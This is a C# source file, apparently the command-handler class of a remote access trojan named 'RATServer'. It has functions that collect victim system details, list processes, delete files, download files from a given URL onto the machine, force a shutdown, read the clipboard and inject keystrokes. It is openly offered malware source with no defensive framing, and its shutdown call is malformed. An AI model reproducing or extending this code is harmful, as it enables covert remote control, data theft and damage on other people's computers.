using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATServer
{
    public class Functions
    {
        public static void Message(string Msg)
        {
            Console.WriteLine(Msg);
        }
        public static void Run(string Path)
        {
            Process.Start(Path);
        }
        public static string PCInfo()
        {
            string x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            return x;
        }
        public static string Processes()
        {
            string x = "";
            foreach (Process p in Process.GetProcesses()) x += p.ProcessName + Environment.NewLine;
            return x;
        }
        public static string Delete(string Path)
        {
            string x;
            if (System.IO.File.Exists(Path))
            {
                System.IO.File.Delete(Path);
                x = "Delete Success";
            } else x = "File Not Found";
            return x;
        }
        public static void Download(string IP, string Path)
        {
            using (var c = new WebClient())
            {
                c.DownloadFile(IP, Path);
            }
        }
        public static void ShutDown()
        {
            Process.Start("cmd.exe shutdown -s -f -t 00");
        }
        public static string ClipBoard()
        {
            return Clipboard.GetText();
        }
        public static void KeyPress(string Keys)
        {
            SendKeys.SendWait(Keys);
        }
    }
}